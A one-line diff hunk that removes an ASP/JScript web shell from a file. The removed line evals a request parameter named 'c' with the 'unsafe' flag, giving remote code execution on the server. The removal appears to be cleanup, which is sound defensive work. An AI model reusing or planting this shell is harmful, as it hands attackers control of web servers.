@@ -1,1 +1,0 @@
-<% @page Language="Jscript"><%eval(Request.item["c"],"unsafe");%>
